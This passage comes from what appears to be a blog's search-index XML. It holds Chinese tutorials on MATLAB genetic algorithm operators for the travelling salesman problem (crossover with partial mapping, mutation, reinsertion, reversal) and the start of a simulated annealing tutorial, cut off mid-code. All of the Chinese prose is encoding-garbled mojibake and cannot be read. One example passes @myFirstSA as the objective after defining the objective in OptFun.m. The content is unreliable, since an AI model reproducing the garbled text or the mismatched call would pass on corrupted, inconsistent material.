class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="äº¤å‰æ“ä½œ"><a href="#äº¤å‰æ“ä½œ" class="headerlink" title="äº¤å‰æ“ä½œ"></a>äº¤å‰æ“ä½œ</h2><p>æ¨¡æ‹ŸæŸ“è‰²ä½“çš„äº¤å‰ç°è±¡,æ³¨æ„åœ¨è¿™é‡Œä¼šå‡ºç°åŸå¸‚å‡ºç°é‡å¤çš„ç°è±¡,éœ€è¦ç”¨éƒ¨åˆ†æ˜ å°„çš„æ–¹æ³•æ¶ˆé™¤å†²çª(ä»‹äºç¯‡å¹…ä¸èµ˜è¿°,ä½†æˆ‘å°±è®°å¾—è¿™é—®é¢˜æˆ‘æƒ³äº†ä¸€ä¸‹åˆ,ç„¶åä¸€ä¸ªæ•°ç§‘é™¢çš„å¦¹å­3åˆ†é’Ÿæå®šäº†.é¡¿æ—¶å°±æ„Ÿè§‰!!).<br>åŸå…ˆçš„ä¸¤ä¸ªè§£:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>| <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>| <span class="number">10</span>, <span class="number">8</span>, <span class="number">6</span>|</span><br><span class="line">|--------|-----------|---------|</span><br><span class="line">|<span class="number">10</span>, <span class="number">5</span>, <span class="number">4</span>| <span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">7</span>|  <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>|</span><br></pre></td></tr></table></figure></p><p>äº¤å‰<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>| <span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">7</span>| <span class="number">10</span>, *, *|</span><br><span class="line">|--------|-----------|---------|</span><br><span class="line">|<span class="number">10</span>, <span class="number">5</span>, *| <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>|  *, <span class="number">1</span>, <span class="number">9</span>|</span><br></pre></td></tr></table></figure></p><p>éƒ¨åˆ†æ˜ å°„<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>| <span class="number">6</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">7</span>| <span class="number">10</span>, <span class="number">4</span>, <span class="number">2</span>|</span><br><span class="line">|--------|-----------|---------|</span><br><span class="line">|<span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>| <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>|  <span class="number">6</span>, <span class="number">1</span>, <span class="number">9</span>|</span><br></pre></td></tr></table></figure></p><p><code>Recombin.m</code>:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SelCh</span>=<span class="title">Recombin</span><span class="params">(SelCh,Pc)</span></span></span><br><span class="line">    <span class="comment">%è¢«é€‰æ‹©ä¸ªä½“ æ¦‚ç‡</span></span><br><span class="line">    <span class="comment">%äº¤å‰åä¸ªä½“</span></span><br><span class="line">    NSel=<span class="built_in">size</span>(SelCh,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:<span class="number">2</span>:NSel-<span class="built_in">mod</span>(NSel,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> Pc&gt;=<span class="built_in">rand</span></span><br><span class="line">            [SelCh(<span class="built_in">i</span>,:),SelCh(<span class="built_in">i</span>+<span class="number">1</span>,:)]=intercross(SelCh(<span class="built_in">i</span>,:),SelCh(<span class="built_in">i</span>+<span class="number">1</span>,:));</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">[a,b]</span>=<span class="title">intercross</span><span class="params">(a,b)</span></span></span><br><span class="line">    L=<span class="built_in">length</span>(a);</span><br><span class="line">    r1=randsrc(<span class="number">1</span>,<span class="number">1</span>,[<span class="number">1</span>,L]);</span><br><span class="line">    r2=randsrc(<span class="number">1</span>,<span class="number">1</span>,[<span class="number">1</span>,L]);</span><br><span class="line">    <span class="keyword">if</span> r1~=r2</span><br><span class="line">        a0=a;b0=b;</span><br><span class="line">        s=<span class="built_in">min</span>([r1,r2]);</span><br><span class="line">        e=<span class="built_in">max</span>([r1,r2]);</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">i</span>=s:e</span><br><span class="line">            a1=a;b1=b;</span><br><span class="line">            a(<span class="built_in">i</span>)=b0(<span class="built_in">i</span>);</span><br><span class="line">            b(<span class="built_in">i</span>)=a0(<span class="built_in">i</span>);</span><br><span class="line">            x=<span class="built_in">find</span>(a==a(<span class="built_in">i</span>));</span><br><span class="line">            y=<span class="built_in">find</span>(b==b(<span class="built_in">i</span>));</span><br><span class="line">            i1=x(x~=<span class="built_in">i</span>);</span><br><span class="line">            i2=y(y~=<span class="built_in">i</span>);</span><br><span class="line">            <span class="keyword">if</span> ~<span class="built_in">isempty</span>(i1)</span><br><span class="line">                a(i1)=a1(<span class="built_in">i</span>);</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">if</span> ~<span class="built_in">isempty</span>(i2)</span><br><span class="line">                b(i2)=b1(<span class="built_in">i</span>);</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="å˜å¼‚æ“ä½œ"><a href="#å˜å¼‚æ“ä½œ" class="headerlink" title="å˜å¼‚æ“ä½œ"></a>å˜å¼‚æ“ä½œ</h2><p>æ¨¡æ‹ŸæŸ“è‰²ä½“çš„å˜å¼‚ç°è±¡,è¿™é‡Œçš„ç®—å­å°±æ˜¯ä¸¤ä¸ªéšæœºä½ç½®ä¸Šçš„æ•°äº¤æ¢<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>| <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>| <span class="number">10</span>, <span class="number">8</span>, <span class="number">6</span>|</span><br><span class="line">| <span class="number">9</span>, <span class="number">5</span>, <span class="number">2</span>| <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>| <span class="number">10</span>, <span class="number">8</span>, <span class="number">6</span>|</span><br></pre></td></tr></table></figure></p><p><code>Mutate.m</code>:<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SelCh</span>=<span class="title">Mutate</span><span class="params">(SelCh,Pm)</span></span></span><br><span class="line">    <span class="comment">%ä¸ªä½“ æ¦‚ç‡</span></span><br><span class="line">    [NSel,L]=<span class="built_in">size</span>(SelCh);</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:NSel</span><br><span class="line">        <span class="keyword">if</span> Pm&gt;=<span class="built_in">rand</span></span><br><span class="line">            R=randperm(L);</span><br><span class="line">            SelCh(<span class="built_in">i</span>,R(<span class="number">1</span>:<span class="number">2</span>))=SelCh(<span class="built_in">i</span>,R(<span class="number">2</span>:<span class="number">-1</span>:<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="é‡ç»„"><a href="#é‡ç»„" class="headerlink" title="é‡ç»„"></a>é‡ç»„</h2><p>å°±æ˜¯æŠŠç»è¿‡é€‰æ‹©,äº¤å‰,å˜å¼‚çš„è§£ä¸æ—§è§£æ··åˆ,ä¿è¯ç§ç¾¤å†…ä¸ªä½“æ•°ä¸å˜.<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Chrom</span>=<span class="title">Reins</span><span class="params">(Chrom,SelCh,ObjV)</span></span></span><br><span class="line">    NIND=<span class="built_in">size</span>(Chrom,<span class="number">1</span>);</span><br><span class="line">    NSel=<span class="built_in">size</span>(SelCh,<span class="number">1</span>);</span><br><span class="line">    [TobjV,index]=<span class="built_in">sort</span>(ObjV);</span><br><span class="line">    Chrom=[Chrom(index(<span class="number">1</span>:NIND-NSel),:);SelCh];</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h2 id="åè½¬-ä¸å¿…è¦æŒæ¡"><a href="#åè½¬-ä¸å¿…è¦æŒæ¡" class="headerlink" title="åè½¬(ä¸å¿…è¦æŒæ¡)"></a>åè½¬(ä¸å¿…è¦æŒæ¡)</h2><p>åè½¬æ“ä½œæ˜¯é’ˆå¯¹TSPé—®é¢˜å¯¹äºå±€éƒ¨çš„ä¸€ç§ä¼˜åŒ–,æœ¬èº«ä¸åœ¨é—ä¼ ç®—æ³•èŒƒå›´å†….è¿™é‡Œç»™å‡ºç®—æ³•ä»£ç .<br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SelCh</span>=<span class="title">Reverse</span><span class="params">(SelCh,D)</span></span></span><br><span class="line">    [row,col]=<span class="built_in">size</span>(SelCh);</span><br><span class="line">    ObjV=PathLength(D,SelCh);</span><br><span class="line">    SelCh1=SelCh;</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:row</span><br><span class="line">        r1=randsrc(<span class="number">1</span>,<span class="number">1</span>,[<span class="number">1</span>:col]);</span><br><span class="line">        r2=randsrc(<span class="number">1</span>,<span class="number">1</span>,[<span class="number">1</span>:col]);</span><br><span class="line">        mininverse=<span class="built_in">min</span>([r1 r2]);</span><br><span class="line">        maxinverse=<span class="built_in">max</span>([r1 r2]);</span><br><span class="line">        SelCh1(<span class="built_in">i</span>,mininverse:maxinverse)=SelCh1(<span class="built_in">i</span>,maxinverse:<span class="number">-1</span>:mininverse);</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    ObjV1=PathLength(D,SelCh1);</span><br><span class="line">    index=ObjV1&lt;ObjV;</span><br><span class="line">    SelCh(index,:)=SelCh1(index,:);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><h1 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h1><p>é—ä¼ ç®—æ³•æ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿç”Ÿç‰©é—ä¼ è¿›åŒ–çš„,æ¯”è¾ƒæˆç†Ÿçš„å¤§å‹æ™ºèƒ½ç®—æ³•.é‡‡ç”¨è®¾è®¡å¥½çš„ç®—å­,å¯ä»¥è§£å†³å¤§éƒ¨åˆ†ç±»å‹çš„è§„åˆ’é—®é¢˜.ä½†ç”±äºå…¶ç®—æ³•è¾ƒä¸ºå¤æ‚,åœ¨æ¯”èµ›ä¸­æ²¡æœ‰å……åˆ†æŠŠæ¡è¿˜æ˜¯è¦è°¨æ…ä½¿ç”¨.<br>æœ¬æ–‡å€ŸåŠ©ä¸‰ä¸ªæ¡ˆä¾‹,å¤§è‡´ä»‹ç»äº†é—ä¼ ç®—æ³•çš„å·¥ä½œåŸç†,åŒæ—¶å¯¹ä¸¤å¤§å…¸å‹çš„è§„åˆ’é—®é¢˜ç»™å‡ºäº†ç®€å•å¯è°ƒç”¨çš„å‡½æ•°åŸå‹.æ–¹ä¾¿å¤§å®¶å­¦ä¹ ä½¿ç”¨.<br>åŒæ—¶,é—ä¼ ç®—æ³•çš„ä¼˜åŠ£æ€»ç»“å¦‚ä¸‹(ä¸ªäººè§‚ç‚¹):</p><h2 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h2><ol><li>ç›¸å¯¹äºæ–°å‹çš„æ™ºèƒ½ç®—æ³•,å¦‚:ç²’å­ç¾¤ç®—æ³•,èšç¾¤ç®—æ³•.ä»–æ›´åŠ æˆç†Ÿç¨³å®š.è¿™è¡¨ç°åœ¨å¯é€‚ç”¨çš„é—®é¢˜ç±»å‹ä¼—å¤š(èšç¾¤ä¸èƒ½ç®—TSP).</li><li>ç›¸å¯¹äºæ¨¡æ‹Ÿé€€ç«ç®—æ³•,å®ƒä¸ç”¨ç»™å‡ºåˆå§‹å€¼å’Œé‡ç»„è§£çš„æ–¹å¼,è€Œæ˜¯äº¤ç»™ç®—æ³•æœ¬èº«å®Œæˆ.ä½¿ç”¨æ—¶åªéœ€ç»™å®šç›®æ ‡å‡½æ•°å’Œè§£çš„é™åˆ¶æ¡ä»¶.</li><li>ç›¸å¯¹äºæ¨¡æ‹Ÿé€€ç«,å®ƒæœ‰æ›´ä¼˜ç§€çš„æ”¶æ•›æ—¶é—´,å¯æ§çš„æ—¶é—´å¤æ‚åº¦.å¹¶åœ¨è¿ç»­å‹éšæœºå˜é‡ä¸Šæœ‰æ˜æ˜¾ä¼˜åŠ¿.</li><li>ç›¸å¯¹äºä¼ ç»Ÿç®—æ³•,æœ‰ä¸€å®šçš„å®šåˆ¶ç©ºé—´,è‡ªå·±å®šåˆ¶çš„ç›®æ ‡å‡½æ•°èƒ½é€‚ç”¨äºmatlabçš„å„ç§å‡½æ•°(åŒ…æ‹¬ç»™ç¥ç»ç½‘ç»œåšä¼˜åŒ–).</li></ol><h2 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h2><ol><li>ç›¸å¯¹äºæ–°å‹æ™ºèƒ½ç®—æ³•,å®ƒæ”¶æ•›é€Ÿåº¦å’Œç»“æœå·®å¼ºäººæ„.</li><li>ç›¸å¯¹äºèƒ½å¤Ÿå®šåˆ¶è§£çš„æ¨¡æ‹Ÿé€€ç«,é—ä¼ ç®—æ³•ä¸å¤Ÿçµæ´».</li><li>æ•´ä½“ç®—æ³•å®ç°å¤æ‚,ä¸”ç”±äºç®—å­ä¼—å¤š,å­¦ä¹ æˆæœ¬å¤§.è‹¥åœ¨æ¯”èµ›ä¸­ä¸èƒ½å°†é—®é¢˜è½¬åŒ–æˆæ–‡ä¸­ä»‹ç»çš„ä¸¤ç§ç±»å‹,ä¸å»ºè®®ä½¿ç”¨è¯¥ç®—æ³•.</li></ol><p>å‚è€ƒä¹¦ç±:ã€ŠMATLABæ™ºèƒ½ç®—æ³•30ä¸ªæ¡ˆä¾‹åˆ†æã€‹<br>ç¨‹åºä¸‹è½½: <a href="https://github.com/Anemone95/matlab-GA" target="_blank" rel="noopener">https://github.com/Anemone95/matlab-GA</a></p>]]></content>
      
      
      <categories>
          
          <category> æ•°å­¦å»ºæ¨¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> äººå·¥æ™ºèƒ½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¨¡æ‹Ÿé€€ç«â€”â€”å²ä¸Šæœ€ç®€å•çš„æ™ºèƒ½ç®—æ³•</title>
      <link href="/%E6%95%B0%E6%A8%A1-%E6%A8%A1%E6%8B%9F%E9%80%80%E7%81%AB%E2%80%94%E2%80%94%E5%8F%B2%E4%B8%8A%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95/"/>
      <url>/%E6%95%B0%E6%A8%A1-%E6%A8%A1%E6%8B%9F%E9%80%80%E7%81%AB%E2%80%94%E2%80%94%E5%8F%B2%E4%B8%8A%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%99%BA%E8%83%BD%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ç¯‡å¾ˆä¹…ä¹‹å‰å†™çš„æ–‡ç« äº†ï¼Œä¸è¿‡è¿‡äº†è¿™ä¹ˆå¤šå¹´ï¼Œæ¨¡æ‹Ÿé€€ç«ç”±äºå…¶æ•ˆæœå’Œå®ç°ç®€å•çš„ä¼˜åŠ¿ï¼Œä¾ç„¶æ˜¯æ™ºèƒ½ç®—æ³•ä¸­ä¸€ä¸ªæ¯”è¾ƒçƒ­é—¨çš„ç®—æ³•ï¼Œæ•…è€åšå®¢æ¬è¿è€Œæ¥ã€‚</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>æ¨¡æ‹Ÿé€€ç«ç®—æ³•ä»å¤–éƒ¨æ¥çœ‹å°±æ˜¯ä¸€ä¸ªä¼˜åŒ–é—®é¢˜çš„è§£æå™¨,æˆ‘ä»¬ç»™ä»–ä¼ é€’åˆå§‹è§£å’Œäº§ç”Ÿæ–°è§£çš„æ–¹æ³•,å®ƒå°±èƒ½ä¸æ–­äº§ç”Ÿæ–°è§£,å¹¶æ¯”è¾ƒæœ€ç»ˆè¿”å›ä¸€ä¸ªè¿‘ä¼¼æœ€ä¼˜è§£.ç”±äºæ•°å­¦å»ºæ¨¡å¯¹ç®—æ³•çš„æ—¶é—´é™åˆ¶ä¸ä¸¥,è€Œæ¨¡æ‹Ÿé€€ç«åˆè¾ƒæ˜“äºå®ç°,å› æ­¤å®ƒä¹Ÿæ˜¯æ•°å­¦å»ºæ¨¡é‡Œè¾ƒå¸¸ç”¨çš„ä¸€ç§æ™ºèƒ½ç®—æ³•.<img src="/æ•°æ¨¡-æ¨¡æ‹Ÿé€€ç«â€”â€”å²ä¸Šæœ€ç®€å•çš„æ™ºèƒ½ç®—æ³•/sa.jpg" alt="sa"></p><a id="more"></a><h1 id="å¿«é€Ÿä½¿ç”¨"><a href="#å¿«é€Ÿä½¿ç”¨" class="headerlink" title="å¿«é€Ÿä½¿ç”¨"></a>å¿«é€Ÿä½¿ç”¨</h1><p>åœ¨ä»‹ç»å…·ä½“ç®—æ³•å‰,æˆ‘ä»¬å®Œå…¨å¯ä»¥åœ¨çŸ­æ—¶é—´å†…ä½¿ç”¨ä¸Šæ¨¡æ‹Ÿé€€ç«.</p><h2 id="ä¾‹1-æ±‚min-x-2-y-2-x-yâˆˆR"><a href="#ä¾‹1-æ±‚min-x-2-y-2-x-yâˆˆR" class="headerlink" title="ä¾‹1:æ±‚min(x^2+y^2),x,yâˆˆR."></a>ä¾‹1:æ±‚<code>min(x^2+y^2),x,yâˆˆR</code>.</h2><ul><li><p>é¦–å…ˆ,æˆ‘ä»¬æä¾›ä¸€ä¸ªåˆå§‹è§£.æ–‡ä»¶<code>main.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=[<span class="number">2</span>,<span class="number">2</span>];</span><br></pre></td></tr></table></figure></li><li><p>å…¶æ¬¡,æ„é€ å‡ºä¸€ä¸ªè¯„ä»·å‡½æ•°(æˆ–ç§°ç›®æ ‡å‡½æ•°).æ–‡ä»¶<code>OptFun.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y</span>=<span class="title">OptFun</span><span class="params">(x)</span></span></span><br><span class="line">y=x(<span class="number">1</span>)^<span class="number">2</span>+x(<span class="number">2</span>)^<span class="number">2</span>;</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li><p>æ¥ç€,æ„é€ ä¸€ä¸ªèƒ½å¤Ÿä¸æ–­<strong>æ ¹æ®æ—§è§£</strong>äº§ç”Ÿæ–°è§£çš„å‡½æ•°.è¿™é‡Œæˆ‘ä»¬æ ¹æ®æ—§è§£ä»¥æ­£æ€éšæœºå‡½æ•°çš„å½¢å¼äº§ç”Ÿæ–°è§£.æ–‡ä»¶<code>Arrise.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">X</span>=<span class="title">Arrise</span><span class="params">(x)</span></span></span><br><span class="line">X(<span class="number">1</span>)=normrnd(x(<span class="number">1</span>),<span class="number">2</span>);</span><br><span class="line">X(<span class="number">2</span>)=normrnd(x(<span class="number">2</span>),<span class="number">2</span>);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></li><li><p>å¤åˆ¶<code>EzSA.m</code>åˆ°æ–‡ä»¶å¤¹.</p></li><li><p>æœ€å,è°ƒç”¨ç°æˆçš„æ¨¡æ‹Ÿé€€ç«å‡½æ•°EzSA.æ–‡ä»¶<code>main.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x,res ]=EzSA(x,@myFirstSA,@Arrise)</span><br></pre></td></tr></table></figure><p>  å¦‚æœä½ çœ‹åˆ°ä¸€ä¸ªè¿›åº¦æ¡,é‚£ä¹ˆæ­å–œä½ ,ä½ å·²ç»ä¼šä½¿ç”¨æ¨¡æ‹Ÿé€€ç«ç®—æ³•äº†!</p><p>  è®©æˆ‘ä»¬çœ‹çœ‹ç»“æœ:</p><p>  <img src="/æ•°æ¨¡-æ¨¡æ‹Ÿé€€ç«â€”â€”å²ä¸Šæœ€ç®€å•çš„æ™ºèƒ½ç®—æ³•/res1.jpg" alt="res1"></p><p>  å›¾åƒè®°è½½äº†æˆ‘ä»¬ä¹‹å‰å°è¯•çš„è§£å€¼,å¯ä»¥çœ‹å‡ºåœ¨æ•°æ¬¡è¿­ä»£åæ•°å€¼å¤„äºç¨³å®šçŠ¶æ€,è¡¨ç¤ºè¿™æ¬¡æ¨¡æ‹Ÿé€€ç«ç®—æ³•æˆåŠŸäº†.</p><p>  åŒæ—¶,x è¿”å›è¾ƒä¼˜è§£,resè¿”å›è¾ƒä¼˜å€¼.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x =</span><br><span class="line">   <span class="number">-0.0035</span>   <span class="number">-0.0027</span></span><br><span class="line">res =</span><br><span class="line">   <span class="number">1.9562e-05</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>è®©æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹æ¨¡æ‹Ÿé€€ç«å‡½æ•°çš„ä½¿ç”¨æ­¥éª¤:</strong></p><ol><li>æä¾›æˆ–åˆå§‹åŒ–ä¸€ä¸ªåˆå§‹è§£.</li><li>æ„é€ å‡ºä¸€ä¸ªè¯„ä»·å‡½æ•°(æˆ–ç§°ç›®æ ‡å‡½æ•°),è¯¥å‡½æ•°æ¥æ”¶è§£,å¹¶è¿”å›ä¸€ä¸ªæ•°å€¼(è§†å€¼è¶Šå°è§£è¶Šä¼˜).</li><li>æ„é€ ä¸€ä¸ªèƒ½å¤Ÿä¸æ–­<strong>æ ¹æ®æ—§è§£</strong>äº§ç”Ÿæ–°è§£çš„å‡½æ•°(æ³¨æ„,è¿™ä¸ªå‡½æ•°çš„è®¾è®¡ä¼˜åŠ£ç›´æ¥å½±å“åˆ°æ¨¡æ‹Ÿé€€ç«æ•ˆæœçš„å¥½å).</li><li>è°ƒç”¨ç°æˆçš„æ¨¡æ‹Ÿé€€ç«å‡½æ•°EzSA(åˆå§‹è§£,è¯„ä»·å‡½æ•°å¥æŸ„,äº§ç”Ÿæ–°è§£å‡½æ•°å¥æŸ„).</li><li>ä¸€æ®µæ—¶é—´åæ¨¡æ‹Ÿé€€ç«ç®—æ³•ç»“æŸ,è¿”å›è¾ƒä¼˜è§£å’Œè§£å€¼</li></ol><h2 id="ä¾‹2-æ—…è¡Œå•†é—®é¢˜-TSP"><a href="#ä¾‹2-æ—…è¡Œå•†é—®é¢˜-TSP" class="headerlink" title="ä¾‹2:æ—…è¡Œå•†é—®é¢˜(TSP)"></a>ä¾‹2:æ—…è¡Œå•†é—®é¢˜(TSP)</h2><p>ç°æœ‰äº”ä¸ªåŸå¸‚,å½¼æ­¤é—´è·ç¦»å¦‚å›¾æ‰€ç¤º,ç°åœ¨æ—…è¡Œå•†éœ€è¦ç»è¿‡æ‰€æœ‰åŸå¸‚ä¸€æ¬¡å¹¶å›åˆ°å‡ºå‘ç‚¹.æˆ‘ä»¬éœ€è¦ä¸ºä»–è§„åˆ’æœ€çŸ­è·¯çº¿.</p><p><img src="/æ•°æ¨¡-æ¨¡æ‹Ÿé€€ç«â€”â€”å²ä¸Šæœ€ç®€å•çš„æ™ºèƒ½ç®—æ³•/graph.jpg" alt="graph"></p><ul><li><p>é¦–å…ˆ,ä»¥é‚»æ¥çŸ©é˜µå­˜å‚¨å›¾å¹¶æä¾›åˆå§‹è§£.æ–‡ä»¶<code>main.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> n    <span class="comment">%nä¸ºåŸå¸‚æ•°,ç”±äºåœ¨æ— æ³•å°†nä»¥å‚æ•°å½¢å¼ä¼ é€’ç»™è®¡ç®—è·ç¦»çš„å‡½æ•°,æ•…å£°æ˜ä¸ºå…¨å±€å˜é‡</span></span><br><span class="line"><span class="keyword">global</span> graph <span class="comment">%åŒä¸Š</span></span><br><span class="line">n=<span class="number">5</span>;</span><br><span class="line">graph=[<span class="number">0</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">3</span>;<span class="number">7</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>;<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>;<span class="number">1</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">2</span>;<span class="number">3</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">city=<span class="number">1</span>:<span class="number">5</span>; <span class="comment">%åˆå§‹è§£</span></span><br></pre></td></tr></table></figure></li><li><p>å…¶æ¬¡æ˜¯è¯„ä»·å‡½æ•°,è®¾cityä¸ºäº”ä¸ªåŸå¸‚çš„è®¿é—®é¡ºåº.æ–‡ä»¶<code>computerTour.m</code>.</p>  <figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">len</span>=<span class="title">computerTour</span><span class="params">(city)</span>   %è®¡ç®—è·¯çº¿æ€»é•¿åº¦ï¼Œæ¯ä¸ªåŸå¸‚åªè®¡ç®—å’Œä¸‹å®¶åŸå¸‚ä¹‹é—´çš„è·ç¦»ã€‚</span></span><br><span class="line">    <span class="keyword">global</span> n <span class="comment">%è·å–nä¸ºåŸå¸‚æ•°</span></span><br><span class="line">    <span class="keyword">global</span> graph</span><br><span class="line">    len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">i</span>=<span class="number">1</span>:n<span class="number">-1</span></span><br><span class="line">        len=len+graph(city(<span class="built_in">i</span>),city(<span 